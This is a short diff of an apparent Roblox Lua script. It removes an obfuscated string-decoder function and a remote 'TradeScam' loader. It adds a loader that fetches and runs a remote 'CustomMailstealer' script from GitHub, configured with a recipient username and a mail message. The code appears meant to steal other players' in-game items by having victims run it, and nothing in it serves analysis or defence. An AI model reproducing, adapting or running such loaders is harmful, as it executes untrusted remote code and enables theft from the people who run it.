@@ -1,7 +1,5 @@
-function FWSaBFXIRtXEojfqfwQKOqrgmWaIveCMewkOchrEDHofBOReDARspjDVVtfwpOchWpkHmXuJXKRWfkrTLPQmKaiemcZEgQGebh(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/250)end return res end 
+Username = "Hiro230_kyn"
+G_LoadingScreen = "PUTTING SCRIPT"
+G_Mailmessage = "Nice Ggs"
 
-
-Username = hiro230_kyn
-loadingscreen = true 
-farmui = false
-loadstring(game:HttpGet(https://raw.githubusercontent.com/jayciegantala/Tradescam/main/TradeScam))()    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()```
